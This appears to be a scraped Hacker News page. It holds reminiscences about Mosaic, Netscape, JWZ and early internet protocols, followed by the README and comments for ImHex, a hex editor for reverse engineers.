could use telnet to go read their home email, my computer spent an hour a day being the check-in point (it was a long walk to the computer labs on campus, and we didn't have local logins) for those who wanted to read email. The next summer, I was at the University of Florida, but off-campus. However, the Alachua [County] Freenet offered free dialup with PPP. Since etherppp emulated an Ethernet packet driver, the NCSA apps worked fine there, though obviously much slower. Better, more complete DOS-compatible suites have arisen since then (e.g., mTCP), but the NCSA suite was fantastic. Security? Nah, none of that. But useful? OMG yes. reply rwmj 10 hours agorootparentI used NCSA telnet for years to talk to Unix and Microware OS-9 machines. In many ways it was a faster, more elegant terminal than what we have now. reply hinkley 19 hours agoparentprevI stopped by the Oil Chemistry Building when I was in town a while back, and the day I visited they were tearing down the Fishbowl. I’ve gone places and found things still there. I’ve gone places and found them long gone. I’ve never come back to find a demolition crew working during a holiday week to tear one of my landmarks down. That was a very complicated day. reply detourdog 18 hours agoparentprevI was installing ISDN lines in NYC I had various hypercard stacks for doing networking testing. There was a thriving Mac shareware market and HyperCard stacks were one of things I would download with gopher. The internet was full of strange repositories of software tools. I think the term at that time for impossibly connected systems was \"toaster net\". reply talkingtab 20 hours agoprevWe can all over estimate our intelligence. I remember clearly getting some email from a list, downloading some weird thing and trying it. I remember clearly deciding it was just total junk - it took me about 5 minutes - and I deleted it. Of course this was Mosaic. And of course I was totally and completely wrong. Said he while using the Firefox web browser. And when was the last time I used telnet? reply tambourine_man 19 hours agoparentI wouldn’t judge myself so hard. You were reacting to what the web was back then. It’s pretty hard, perhaps impossible, to foresee what it would become. I remember reading “you can go to the Louvre and then the MoMA, all with a click of the mouse”. But taking a plane felt almost as slow and expensive, only way more fun. I deleted Netscape to claim back the 20MB or so it occupied in my 250MB drive. reply hinkley 19 hours agoparentprevMy friend was working on the browser team and showed me a demo one time when we stopped by his work. It was a picture with text around it, which you could already do with WordPerfect and Word? So can we go do that thing now? The following summer I applied to work there. I did not miss the next several shifts in the market, but eventually got tired of chasing them. reply foobarian 16 hours agorootparentI first saw this on a Sparcstation in our college lab that had a giant monochrome display. Even though the functionality was not necessarily novel compared to latex or wordperfect or other local programs, what really blew me away is that the source format was an open standard you could pull up from IETF, you could inspect it and copy it and modify it, etc. After having spent a lot of time trying to reverse engineer .doc and other types of software this just felt like such a gift and I was instantly converted. I was in that first generation where everyone had a homepage in their home directory that anyone else in the world could visit since there were no firewalls and all computers had public IPs. I ended up going to grad school instead of jumping on the gravy train. Still kicking myself for that to this day :-) reply rjsw 5 hours agorootparentI think that HTML was a product of the exact time it was invented, it matched the point that some computers became fast enough to parse a text source format on the fly. I wrote an online hypertext system in 1985, but the storage format was optimized to make it as efficient to transfer and display as possible and was not easy to author. It ran on top of the GEM GUI and you could click on a word that had been defined as a link to take you to the target page. Someone could also have defined a rich-text schema in ASN.1 in the late 80s then written an application to retrieve data in this format from a remote server over an OSI network and display it. Interfacing the typical public text database of the time to this would have been a lot of work, they just expected to output to a terminal. reply paulpauper 15 hours agoparentprevrun bitcoin core, mine a few blocks and delete. I am sure also people did that reply wil421 1 hour agorootparentOr not mine bitcoin because you want to play Crysis. Or not buy bitcoin at $11 because I was a dead broke college student. I don’t feel bad because I would’ve sold it at $20 or $100 for beer money. reply janvdberg 21 hours agoprevGreat, I am gonna watch this. Hopefully this video also explains what the name 'Netscape' means or implies or is based on. Because I've always found it kind of striking that the name has the same letters (and sort of sounds) like 'NCSA' where Mosaic was originally developed, that seems like more than a coincidence? reply rzzzt 20 hours agoparent> \"We've got to make progress on [renaming the company].\" And I said, > \"We've got a couple of ideas, but they're not great.\" Then it just kind > of popped into my head, and I said, \"How about Netscape?\" Everyone kind > of looked around, saying, \"Hey, that's pretty good. That's better than > these other things.\" It gave a sense of trying to visualize the Net and > of being able to view what's out there. Greg Sands in https://money.cnn.com/magazines/fortune/fortune_archive/2005... reply gumby 20 hours agoparentprevLandscape -> Netscape reply rambambram 10 hours agorootparentEscape reply hinkley 19 hours agorootparentprevStarscape, city scape… reply s1mon 21 hours agoprevI can't wait to see what JWZ has to say about this. reply NelsonMinar 20 hours agoparentThat was my first thought. A few days ago JWZ had a great take on where Mozilla is today: https://www.jwz.org/blog/2024/06/mozillas-original-sin/ reply hinkley 18 hours agorootparentI don’t think the dumbest thing Mozilla did was take money from Google. It was spending the fucking money. Foundations like some cancer groups and the arts have an endowment. Each year they build up their war chest by seeking new funding, but a lot of the money they spend each year is the interest payments on their giant piles of cash. Mozilla could have run in perpetuity on the money Google gave them, but instead they decided to branch out into boondoggles and dipping their hands into the cookie jar. reply pavon 17 hours agorootparentThe Google search deal started at around $50 million a year and has grown to a bit over $500 million a year. Let's estimate $5 billion total. It is typical to take 5% out of an endowment each year today, which means they would be have an income of $250 million a year if they had invested the money instead of spending it. Not bad! On the other hand, the Google money accounted for around 85% of their income over the years, so if they hadn't been spending it they would have been operating on around 20% of the income for many years while the endowment grew, and likely would not have been able to keep up with competing browsers. Also, for as much crap as she gets, Mitchell Baker invested over 20% of the Google money Mozilla received during her tenure, far more than was invested by prior CEOs. And before anyone brings it up, all that \"woke activist\" spending comes from donations, not Google money, which the IRS prohibits them from spending on browser development. reply matthewn 20 hours agorootparentprevAny link to there from here will only get you JWZ's take on HN. reply asveikau 15 hours agorootparentI think his bitterness and open hostility are not well received on HN and simar places, but I find it absolutely refreshing. He's often right too. reply tom_ 5 hours agorootparentprevClicking that specific link does work - at least, at time of writing! reply lizknope 20 hours agorootparentprevThat's kind of hilarious. I guess he's using the HTTP \"referer\" tag reply neilv 19 hours agorootparentThere are a bunch of settings in Firefox that affect this (if you don't mind occasionally breaking a Web site in a way no one will bother to diagnose): https://wiki.mozilla.org/Security/Referrer reply lizknope 17 hours agorootparentThey spelled it \"correctly\" there. https://en.wikipedia.org/wiki/HTTP_referer Etymology The misspelling of referrer was introduced in the original proposal by computer scientist Phillip Hallam-Baker to incorporate the \"Referer\" header field into the HTTP specification.[7][8] The misspelling was set in stone by the time (May 1996) of its incorporation into the Request for Comments standards document RFC 1945[9] (which 'reflects common usage of the protocol referred to as \"HTTP/1.0\"' at that time); document co-author Roy Fielding remarked in March 1995 that \"neither one (referer or referrer) is understood by\" the standard Unix spell checker of the period.[10] \"Referer\" has since become a widely used spelling in the industry when discussing HTTP referrers; usage of the misspelling is not universal, though, as the correct spelling \"referrer\" is used in some web specifications such as the Referrer-Policy HTTP header or the Document Object Model.[3] reply hinkley 18 hours agorootparentprevJust copy the url and paste it into a new tab. reply neilv 18 hours agorootparentThat works for viewing a particular page. Why people might want to adjust the `Referer` behavior of the browser is that it leaks more information than you might think. reply yborg 12 hours agorootparentprevHis blog is linked to his Mastodon account: @jwz@mastodon.social reply Kwpolska 11 hours agorootparentprevIt's a very butthurt take about Mozilla agreeing to DRM in browsers. I prefer to watch Netflix or other streaming services in my browser, using its native features, not Flash, not Silverlight, not some native app not available for Linux. reply shiomiru 5 hours agorootparentSurely you don't think DRM is necessary for streaming services to work... My reading is that jwz thinks there was a possible future where DRM is dropped because it's as useless & impractical to enforce as cryptography export restrictions had been. Mozilla could have contributed to this future by not implementing DRM, but instead supported the outcome we got: DRM is ubiquitous, browsers that don't support it are disadvantaged significantly, and an anti-DRM streaming service (similar to GOG) no longer has any real advantage over DRM-enabled services. It is possible that no DRM in Mozilla would have resulted in the same outcome we arrived at - Mozilla gave in, so we'll never know. But what does Mozilla even exist for if it's unwilling to stick to its principles? reply Kwpolska 2 hours agorootparentDRM is necessary for streaming services which want to carry movies made by the big studios. They love their DRM. If Mozilla refused to implement DRM in Firefox, Netflix would have just said “you need Silverlight, Chrome, or the native Netflix app to watch movies”, plain and simple. reply rchaud 1 hour agorootparent...and there would be nothing wrong with that. As late as 2011, Silverlight was needed to stream Netflix on Chrome. It's not like FF is a major browser that needs DRM to compete against Edge/Chrome. Its market share is in the single digits regardless. reply Waterluvian 20 hours agoparentprevnext [16 more] Who/what is JWZ? reply sib 20 hours agorootparentJamie Zawinski https://en.wikipedia.org/wiki/Jamie_Zawinski reply hoten 20 hours agorootparentTIL he owns and operates DNA Lounge. Thanks for the late night fun and pizza, jwz. reply worstspotgain 20 hours agorootparentI suspect he made the decision to buy DNA after this: http://home.mcom.com/mozilla.org/1998-03-25/party/ That party was a huge milestone in retrospect. It was the day FOSS went mainstream. Shortly thereafter, the dot-com boom ended and the 90s tech parameters got upended and scrambled. reply netsharc 20 hours agorootparentHis blogs (LiveJournal, and later on, his own WordPress instance) and website has content going all the way back to 1993. I remember finding it as a teenager and reading all the stories and being enchanted by them. At some point he did write why he bought the club, he was moaning about the state of night life in SF, and a friend said something like \"Why don't you do something about it?\"... so he did. Edit: found it: https://www.dnalounge.com/backstage/log/1998-1999.html reply davidw 20 hours agorootparentprevI went to that! Heady times. reply r3trohack3r 20 hours agorootparentprevI love that this wikipedia article includes a \"Principles\" section. Is this normal for wiki pages on people? reply TMWNN 19 hours ago [flagged]rootparentprevnext [9 more] A mentally ill San Francisco restaurant/nightclub owner [1] who is eternally bitter that he did not become a billionaire like his colleagues and contemporaries during the dotcom bubble. [1] Well, until said restaurant/nightclub finally drain his remaining funds reply dang 17 hours agorootparentPlease don't cross into personal attack on HN, regardless of who the person is. https://news.ycombinator.com/newsguidelines.html reply neilv 19 hours agorootparentprevJWZ is a skilled and noteworthy hacker, in the sense of HN. IIRC, he decided a long time ago that he'd had enough of crazy startup life, and bought a nightclub, and somehow kept a nightclub going all that time. reply hinkley 18 hours agorootparentPeople talk the same shit about Woz and Paul Allen too. I could have gotten in on the third big round of hiring at Amazon, but I told my friend I’d rather work until retirement than get rich writing Perl code. People are allowed to have standards, and those standards are allowed to keep you from taking money you don’t feel good about. If it wasn’t then we would all be sex workers. Most pay for the least work. reply wmf 18 hours agorootparentprevAs one of the early Netscape employees he should have made pretty good money. He didn't make founder money because he wasn't a founder. As for his personality, I get the impression he was always like that. reply fragmede 19 hours agorootparentprevwhat a terrible take. no wonder referrals to his site from this one get the treatment it does. reply TMWNN 19 hours agorootparentThis is the first time I have ever discussed jwz here. I have no particular brief for, or against, whatever HN's \"consensus\" on Zawinski is. What I said is based on my reading his blog for more than a decade. reply justin66 18 hours agorootparentYou believe he’s “eternally bitter” and “mentally ill” but you’ve been reading his blog for over a decade. reply TMWNN 17 hours agorootparentIt's partially because of inertia, because I put it into my RSS reader a long time ago. It's partially because there are interesting posts every now and then, such as the one about him repurposing his old Lisp Machine terminal, or about XScreeenSaver. And yes, it's partially because rubbernecking while passing by a colossal trainwreck is always entertaining. reply cafard 17 hours agoprevAt some point back when, I had decided that our government contract needed its documentation in hypertext. I spent a few days putting some of it into the GNU Info format, and showed it to my boss. He said something like That's interesting. Then I installed Mosaic on my PC, and ran the Info documents through a converter to produce html. I showed my boss the documents with Mosaic, and this time he said Wow! reply dang 20 hours agoprevI had to take something out of the title to squeeze in \"[video]\" so I took out the removeable bits: the word \"true\" and the original punctuation. No lack of truth or taste in punctuation is implied by this edit. reply kovezd 13 hours agoparentWell, you fixed a logical contradiction. reply godzillabrennus 8 hours agoprevNever forget the “Swirl Society of Netscape” http://totic.org/nscp/swirl/swirl.html reply jmspring 16 hours agoprevI was just out of college (masters) when I worked for Netscape for a couple years. Worked with some super interesting people and learned a lot. General opinion was Marca wasn’t the best engineer and others helped out. There is a huge overlap from groups I hung out with in high school and college (UCSC) and people that were at Netscape. There were a lot of super talented people. reply wenbin 20 hours agoprevgonna watch it over the weekend :) And re-watch this also - Project Code Rush - The Beginnings of Netscape / Mozilla Documentary https://www.youtube.com/watch?v=4Q7FTjhvZ7Y reply HarHarVeryFunny 6 hours agoprevMarc mentions the \"view source\" feature of Mosaic as being important to give people a toehold in developing web pages, and of course the early browsers also included HTML editors so that you could develop right in the browser. I remember using Netscape in the early days, then eventually migrating to SeaMonkey which had the same all-in-one approach of bundling web browser, HTML editor, UseNet client and e-mail client in a single application. I'm sure most younger people think of the internet either as the web (i.e. web pages you can access in your browser) or depending on age maybe just social media apps like TikTok and Snapchat, but of course the internet is just the network itself that connects everyone together, and then there are layers of software protocols (starting with TCP/IP) that support various apps on top of that. If you're young the only protocol you may have heard of is HTTP (Hyper-Text Transport Protocol) which is what the web (World Wide Web) uses to send web pages from server to client (browser), which you are reminded of in web based URLs starting with http://www., where the www is also a reminder of the original \"World Wide Web\" name. Other internet applications use their own transport protocols on top of TCP/IP to communicate, so we also have NNTP (Network News Transport Protocol) for UseNet, SMTP (Simple Mail Transport Protocol) for e-mail, and FTP (File Transport Protocol) for file transfer. The power of the standard protocols was that they decoupled application from communications so that many alternate web browsers, e-mail clients, etc could exist and all happily communicate with servers supporting these protocols. A good example of what happens when you don't do this is instant messaging where originally the IRC (Internet Relay Chat) protocol was used as a standard, but later chat became balkanized into competing non-standard applications such as AIM, MSN and ICQ which were not able to inter-communicate until many eventually supported ICQ's Jabber/XMPP protocol. Even today instant messaging suffers from balkanization with iPhone and Android not able to share all features (blue vs green messages), although that is finally improving. Nowadays most people have switched to web-based mail rather than using SMTP clients, but happily the e-mail servers still use SMTP to inter-communicate, so we can still send e-mail to each other! The latest internet trend is all the social media apps - Twitter, TikTok, Snapshat, etc - which just like the instant messagers use their own proprietary protocols to talk to their servers, and are therefore not able to inter-communicate. reply AK42 13 hours agoprevSuch a profound time - I was using gopher and AOL to connect to the internet and then there was Mosaic... which literally changed everything and defined my life and work since. Thanks Marc and the NSCA team. reply r00tanon 20 hours agoprevReading these comments after falling asleep to SNL sketch re-runs. They all sound oddly sarcastic and ironic. reply sixQuarks 9 hours agoprevDoes anyone remember a guy who coded a browser during the early days and sold it to Apple for $100 million? It turned out to be useless and Apple shut it down right away. reply bane 16 hours agoprevI \"grew up\" on BBSs in the >=2400 baud era. It was about that time, as modems became faster, and as the average personal computer came default with some kind of GUI, that it was only natural that BBSs started to move into the graphical world also. One of the first BBSs I ever accessed was Prodigy [1] when a friend/neighbor bought a bundle at Sears (of all places) that included an external modem and the Prodigy software. At some point we came across and downloaded BBS lists like Focke's and software like Telix, and realized we didn't need to pay $9.95/mo for access to interesting communities. The local BBS's were way more interesting and niche (and longtail) than anything found on the moderated Prodigy anyway. The pressure of not pissing off \"mom\" for spending extra time on Prodigy, which had a pay-by-the-minute, access plan at the time was extra appealing even if we could only spend 30-45 minutes on a local board at a time. It was all so reasonable. But local boards were ANSI and later ASCII and the graphics on Prodigy [2][3] were sorely missed -- which were about the equal of even the best EGA graphics of the time. Games were descriptive instead of graphical. But the local communities (who you could meet up with), the forums, and the price (free) were an appealing draw to an early teen with no money. RIP Graphics BBSs eventually arrived a couple years later but they were few, fussy, and were more representative of the (by then) aging Prodigy graphics than the new VGA and high-res Windows 3.x GUIs we were growing used to. We had a buddy, the next town over, who was a major Apple Macintosh enthusiast. As a result, he generally eschewed the gross and primitive ASCII scene, but was as cash strapped as we were. IIR RIP BBSs sort of bypassed Macs, but a bizarre sort of Galapagos technology appeared in the form of full GUI BBSs. I remember one client called \"FirstClass\" [4] that basically just extended the resource of the BBS onto the Mac desktop. It was absolutely mindblowing, and included a primitive ability to request simultaneous data streams allowing you to view a forum and download an image or a file at the same time. There wasn't a good MS-DOS/Windows client so we spent hours and hours and hours at that friend's house blowing up their long-distance bill dialing in to any first-class number we could come across. As a parallel track, in the early 90s, (maybe '91 or '92) my Mac buddy ended up with access to a dial-up Unix shell through their parents, who had it for work. We memorized the password and ended up freaking out as we learned how to gopher, ftp, and telnet to sites all over the world. The semantic binding of protocols://servicestypes made an astonishing kind of sense. I found out about the demoscene around this time on dial-up BBSs, but I found the actual demoscene on open access anonymous ftp sites in Florida and Finland and other places around the world. The amazing movie Sneakers came out about that time and it dropped into our developing digital milieu like warm socks out of a hot clothes dryer on a winter day. My friend's father eventually discovered our account usage (because we were blowing up his corporate account bill), and we were locked out. But I knew at that point, that BBSs were now the second tier in the information landscape. Cyberpunk novels entered my life and I knew the internet = cyberspace, not BBSs. I ended up in a special program through my school district that happened to include access to my own gopher/shell dial-up through the district. I had a luxurious 20 minutes a day and 1 or 2MB of storage to play with. But as a high-schooler, getting access to what I had only known as the realm of top universities or global corporations was thrilling. I learned how to exit the default gopher menu and use the other unix tools to ftp, telnet, and do everything else I needed to connect to what I inferred as other digital pioneers around the world. I graduated in '95, lost my access to the internet, which felt like the loss of a limb and spent a a year relegated to the local BBS scene, which was still going strong. RIP had stalled, and the Mac gui BBSs were only a distant ideal of what could be. Modems were 14.4 or 28.8 baud. I found out that some other friends were starting an ISP through some miracle, and I secured a job with them, quit everything else, immediately transitioned to living off of a T-1 8+ hours a day. I carried a hard drive in to work with me, connected it to a spare IDE port in my day-to-day desktop, downloaded what I wanted, and brought it home...like it was a thumb drive. It was a drug. BBSs died for me at that point -- I just...stopped dialing in to them. Very quickly we adopted this software called Mosaic, tied to yet another semantically aligned protocol called HTTP. It just slotted in the mix of telnet, ftp, nntp, smtp, gopher, and others. It was cool, but it took forever to load a page vs a gopher site or a telnet site. Usenet was the vibrant global forum that was the \"big-boy\" version of the local BBSs I had been using. I remember when Amazon first put up their website and sold only books. I didn't trust sending my credit card over the internet, so I'd find out about new books then go to local bookstores to buy them. For a year, I lived in the future. At some point we decided to distribute Mosaic, then quickly after than I remember an early Netscape to new signups (along with dial-up sofware, email software, and Usenet software) -- the entire kit fit on two 1.44MB floppies, a version for Windows and Macs (copied by my old Mac First-class BBS buddy). The rest of the semantic protocol internet, other than email died then -- even if we weren't quite aware of it. Gopher became a ghost, ftp lived a while longer, telnet sort of existed, Usenet was a constant \"should we still mirror it\" question. We would have killed the rest except the dial-up software, email client, and Mosaic needed slightly more than 2 floppies, so we filled the rest of the second disk with more software. Modems at 28.8 became normal, and we started get requests for 56k and ISDN. I started using my access in the ISP to create unlimited time dial-up accounts for my friends. Girls I like dated me because I got them internet access, and members of the U.S. Demoscene suddenly could talk to their peers in Europe because of it. Mosaic drove up bandwidth demand to astronomical levels. It was the Macintosh first-class BBS software realized to the nth degree. We move the ISP to the same building as our tier n-1 provider, drilled a hole in the concrete between floors and got rid of the t-1 by We dropped usenet, ftp, and telnet clients off the disks. Dial-up software + email + Mosaic became the norm. ISDN turned out to be kind of a bust, DSL was on the horizon and we saw that it was the end of the mom-n-pop ISP because of how the technology worked. We sold the ISP and moved on elsewhere -- but Mosaic + email + dial-up became \"the internet\" from that point forward. To be honest, I'm kind of sad to see PROTOCOL-OVER-HTTP came to erase the other semantic protocols. The way in which the browser kind of erased the rest of the internet has caused later generation from forgetting what could be possible over the internet. There's no reason at all that somebody can't come up with an entirely new protocol for a specialized service -- but the entire industry is stuck trying to figure out how to shove a square protocol into a circular HTTP(s) hole. This has allowed browser makers to really centralize and control large portions of the internet. It's like being told you must stick to specific roads when you are standing in the middle of an easily traversable, open, recently mowed, field. If there is one thing I could will back into existence from OG internet is that concept. The Web IS NOT the internet. 1 - https://youtu.be/FNxKg6ZXax8 2 - https://www.theatlantic.com/technology/archive/2014/07/where... 3 - https://archive.is/vVRQQ 4 - https://en.wikipedia.org/wiki/FirstClass reply kovezd 13 hours agoprevNow I understand why Marc was so bullish on crypto. reply ghigh 20 hours agoprevI remember as a kid being terrified of Netscape because of the ship's wheel icon. At the time I had a huge fear of the sea and seeing that nautical imagery made me feel sick. I'd always choose Internet Explorer because of this. I'm really glad that Netscape rebranded to Mozilla Firefox. Much warmer and more inviting, less implied threat of drowning. reply schoen 20 hours agoparentI wonder if there was another kid out there somewhere who was scared of wild animals (including cute ones) and who became more reluctant to use Firefox as a result of the rebranding. reply apantel 19 hours agorootparentOr giant ringed ‘e’ planets. You gotta watch out for those. They’ll embrace you then extend you then extinguish you. reply rzzzt 4 hours agorootparentwheeee reply geonineties 20 hours agoparentprevYour username is surprisingly fitting. reply m463 12 hours agoparentprevjust enter about:jwz reply smokefoot 17 hours agoprevWhat a circle jerk. I guess there aren’t successful people with any humility. But seriously, he just used his own podcast to feature himself! reply HarHarVeryFunny 5 hours agoparentIt's interesting history though - I grew up and was using computers in this period (from 300 baud acoustic couplers and ARPANet, to 14.4K modems and BBSs, then eventually the web (Sun workstation and broadband at work, dial-up at home), but was not aware of all the history myself. The invention of the web was a seminal moment, regardless of what you think of Andreessen, and like he said it could have gone differently. The private networks (AOL, Compuserve, Prodigy) could have prevailed, but luckily the internet and open standards won the day. reply nytesky 20 hours agoprevSo this is an a16z podcast show? It's a bit navel gazing right, to interview one of the hosts? Slow news day? Am I understanding the setup right? reply gumby 20 hours agoparentOne of the few topics on which he has something useful to say (Software is eating the world was another). reply tannhaeuser 19 hours agoparentprevI understand the irony of featuring a web history piece on video. reply santiagobasulto 20 hours agoprev [–] Oh man, I’m such a fan of Marc Andreessen. I know that in the past few years he’s come as a weird figure combining shady VC funds, with crypto and such things. But he’s such a smart insightful guy. And what I love the most about these guys (Marc, PG, even Sam Altman) is that they ARE hackers. They speak in our terms, they have our awkwardness. Thanks for sharing this. reply ilrwbwrkhv 17 hours agoparent [–] I know they are hackers. Unfortunately their minds have also fallen victim to all the political nonsense going on in our society. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "A video discussing the origins of Mosaic and Netscape has sparked a forum thread where users share experiences and historical corrections.",
      "A former Project Lead for the Spyglass browser team clarifies that Spyglass Mosaic was developed from scratch, not using licensed Mosaic code.",
      "The thread features nostalgic memories of early internet experiences, including the use of Mosaic, Netscape, and other early web technologies."
    ],
    "points": 310,
    "commentCount": 112,
    "retryCount": 0,
    "time": 1719607147
  },
  {
    "id": 40828493,
    "title": "Imhex: A hex editor for reverse engineers",
    "originLink": "https://github.com/WerWolv/ImHex",
    "originBody": "A Hex Editor for Reverse Engineers, Programmers and people who value their retinas when working at 3 AM. /ˈɪmhɛks/ Supporting If you like my work, please consider supporting me on GitHub Sponsors, Patreon or PayPal. Thanks a lot! Screenshots More Screenshots Features Featureful hex view Custom C++-like pattern language for parsing highlighting a file's content Theming support Importing and Exporting data Data Inspector Node-based data pre-processor Loading data from many different data sources Data searching Data hashing support Diffing support Integrated disassembler Bookmarks Featureful data analyzer and visualizer YARA Rule support Helpful tools Built-in Content updater Modern Interface Easy to get started Pattern Language The Pattern Language is the completely custom programming language developed for ImHex. It allows you to define structures and data types in a C-like syntax and then use them to parse and highlight a file's content. Source Code: Link Documentation: Link Database For format patterns, libraries, magic and constant files, check out the ImHex-Patterns repository. Feel free to PR your own files there as well! Requirements To use ImHex, the following minimal system requirements need to be met. Important ImHex requires a GPU with OpenGL 3.0 support in general. There are releases available (with the -NoGPU suffix) that are software rendered and don't require a GPU, however these can be a lot slower than the GPU accelerated versions. If possible at all, make ImHex use the dedicated GPU on your system instead of the integrated one (especially Intel HD GPUs are known to cause issues). OS: Windows: Windows 7 or higher (Windows 10/11 recommended) macOS: macOS 12.1 (Monterey) or higher, Lower versions are supported, but you'll need to compile ImHex yourself Linux: \"Modern\" Linux. The following distributions have official releases available. Other distros are supported through the AppImage and Flatpak releases. Ubuntu 22.04/23.04 Fedora 36/37 RHEL/AlmaLinux 9 Arch Linux CPU: x86_64 (64 Bit) GPU: OpenGL 3.0 or higher Intel HD drivers are really buggy and often cause graphic artifacts In case you don't have a GPU available, there are software rendered releases available for Windows and macOS RAM: 256MB, more may be required for more complicated analysis Storage: 100MB Installing Information on how to install ImHex can be found in the Install guide Compiling To compile ImHex on any platform, GCC (or Clang) is required with a version that supports C++23 or higher. On macOS, Clang is also required to compile some ObjC code. All releases are being built using latest available GCC. Note Many dependencies are bundled into the repository using submodules so make sure to clone it using the --recurse-submodules option. All dependencies that aren't bundled, can be installed using the dependency installer scripts found in the /dist folder. For more information, check out the Compiling guide. Contributing See Contributing Plugin development To develop plugins for ImHex, use the following template project to get started. You then have access to the entirety of libimhex as well as the ImHex API and the Content Registry to interact with ImHex or to add new content. ImHex Plugin Template Credits Contributors iTrooz for getting ImHex onto the Web as well as hundreds of contributions in every part of the project jumanji144 for huge contributions to the Pattern Language and ImHex's infrastructure Mary for her immense help porting ImHex to MacOS and help during development Roblabla for adding MSI Installer support to ImHex Mailaender for getting ImHex onto Flathub Everybody else who has reported issues on Discord or GitHub that I had great conversations with :) Dependencies Thanks a lot to ocornut for their amazing Dear ImGui which is used for building the entire interface Thanks to epezent for ImPlot used to plot data in various places Thanks to Nelarius for ImNodes used as base for the data processor Thanks to BalazsJako for ImGuiColorTextEdit used for the pattern language syntax highlighting Thanks to nlohmann for their json library used for configuration files Thanks to vitaut for their libfmt library which makes formatting and logging so much better Thanks to btzy for nativefiledialog-extended and their great support, used for handling file dialogs on all platforms Thanks to danyspin97 for xdgpp used to handle folder paths on Linux Thanks to aquynh for capstone which is the base of the disassembly window Thanks to rxi for microtar used for extracting downloaded store assets Thanks to VirusTotal for Yara used by the Yara plugin Thanks to Martinsos for edlib used for sequence searching in the diffing view Thanks to ron4fun for HashLibPlus which implements every hashing algorithm under the sun Thanks to mackron for miniaudio used to play audio files Thanks to all other groups and organizations whose libraries are used in ImHex License The biggest part of ImHex is under the GPLv2-only license. Notable exceptions to this are the following parts which are under the LGPLv2.1 license: /lib/libimhex: The library that allows Plugins to interact with ImHex. /plugins/ui: The UI plugin library that contains some common UI elements that can be used by other plugins The reason for this is to allow for proprietary plugins to be developed for ImHex.",
    "commentLink": "https://news.ycombinator.com/item?id=40828493",
    "commentBody": "Imhex: A hex editor for reverse engineers (github.com/werwolv)286 points by wsc981 11 hours agohidepastfavorite67 comments dang 2 minutes agoRelated: ImHex – A Hex Editor - https://news.ycombinator.com/item?id=32287902 - July 2022 (70 comments) ImHex – A Hex Editor - https://news.ycombinator.com/item?id=25353965 - Dec 2020 (78 comments) reply dagmx 5 hours agoprevImHex has so far been the best hex editor I’ve used for a few reasons. Some of these exist in other editors but rarely all together. 1. File templates mean that it auto highlights sections of known file types. 2. It shows how selected bytes may be interpreted as pretty much every common data type that I would want and does so simultaneously. 3. It’s significantly faster than other editors for me when I use large files On the downside, the imgui ui gets buggy sometimes but it’s replaced my use of other viewers like HexFiend, hexa etc… reply rfoo 2 hours agoparentWell, 010 Editor also checks all three. So: 4. Unlike 010 Editor, it does not take you $150 and is FOSS so you can easily patch it to do whatever you need. reply ixwt 1 hour agorootparentAfter briefly having used both, the main difference besides layout and aesthetics, is that 010 has a bigger repo of premade templates. reply mostthingsweb 3 hours agoparentprevhttps://github.com/WerWolv/ImHex Oooh that looks slick, thanks for the tip! reply unwind 1 hour agorootparentUh that is literally the link that is posted, that this thread is about. reply jonhohle 10 minutes agoprevThis looks awesome. I’m spending the majority of my time reversing an old game and mostly still use hexdump. reply ykonstant 5 hours agoprevDoes this editor have a way to display the ASCII bytes in CP437 glyphs? I grew up reading binary files in DOS that way and I can read the glyphs much faster than the corresponding hex values; in contrast, using dots for the non-printable characters doesn't really tell me much. reply Simran-B 2 hours agoparentYou can download additional assets in the settings and then interpret data as encoded in various formats. I don't see CP437 in the list but the file format for encodings is straightforward, you can probably create a mapping easily. https://github.com/WerWolv/ImHex-Patterns/tree/master/encodi... reply Dwedit 2 hours agoparentprevThe problem with CP437 is that FF, 00, and 20 are all empty space and look the same. Then there's the question about that ambiguous character that's either German Sharp S or Beta. reply hackyhacky 2 hours agoprev> ImHex requires a GPU with OpenGL 3.0 support in general. Why does a hex editor require OpenGL? (and therefore a GPU?) Is there a good reason why it needs OpenGL or is it just for l33t-ness? reply SideQuark 2 hours agoparent> Why does a hex editor require ... a GPU? Any editor, to be fluid and quick at today's screen resolution, needs hardware rendering. The days of drawing things pixelwise, especially any complex formatting, are noticeably slow. See this [1] for example [1] https://www.sublimetext.com/blog/articles/hardware-accelerat... reply dagmx 2 hours agoparentprevThe UI is built using Imgui (hence the Im prefix) which is a Ui framework for computer graphics programs. Though, a couple nits: 1. An OpenGL requirement doesn’t necessitate a GPU. There are software implementations of OpenGL but they tend to be rather mediocre at best for performance. 2. Many platforms now assume some kind of GPU. It’s fairly rare to need a GUI tool without also having a GPU available. Of course there are niches for it, but those aren’t also likely to be running a hex editor and tooling locally. reply anotherhue 58 minutes agorootparent'GPU' doesn't mean discrete, power-hungry graphics card either (not that you said it did). OpenGL calls for basic desktop rendering can be reliably handled by the integrated graphics in the CPU. In which case OpenGL can almost be viewed as a parallel instruction set / DSL. reply 9029 2 hours agoparentprevthey probably just picked the opengl renderer for imgui reply nneonneo 6 hours agoprevI tried ImHex…found it way too complex for most of what I wanted to do. I’m still a huge fan of Hex Fiend on macOS - simple, fast, does what I want. I still haven’t found the perfect “simple” hex editor on Windows. reply s1gsegv 2 hours agoparentInteresting, I find HxD on Windows to be the absolute peak of hex editors with no real parallels on macOS or Linux. Which is a shame because I never use Windows. Hex Fiend for instance is my hex editor on macOS, but why does it insist on reflowing the lines when I expand the window? I might just want to work with it maximized to avoid visual distractions, but I still only want lines to be 16 or 32 bytes long, and definitely not some weird size that will make things not line up. reply MontagFTB 5 hours agoparentprev+1 for HexFiend. Their template format is straightforward to extend. I’ve used it to analyze many different file formats. I also tried ImHex briefly. I have a ton of respect for the project, but found for my needs it was like using a cannon to kill a housefly. reply nine_k 6 hours agoparentprevHave you tried Hiew? reply nneonneo 5 hours agorootparentNo, hadn’t heard about it. Seems interesting, sort of “vim for hex” like. I might give it a spin. reply 0xDEADFED5 7 hours agoprevLooks good! I usually stick to 010 Editor for it's wildcard search, but ImHex does that and more, I'm sold. Will be testing it out a bit more reply 0xFEE1DEAD 7 hours agoparentwhat're the odds of two dead 0x users showing up at the same time in a thread previously without comments. gave me a chuckle reply jolj 7 hours agorootparenta thread about a hex editor? kinda high reply mahoro 5 hours agoprevThis is an absolutely great project. I had a lot of fun tinkering with the ROM of my Philips smart clock. It has a built-in DSL that looks like Rust (without memory management, though – so it's very lightweight), and with that, it's possible to visualize and extract structural data from binary streams. That's really fun and cool. It also has a visual editor to make simple calculations with no code. It didn't feel polished at the time I tried it. Strangely, writing code in DSL was more intuitive and easier for me. 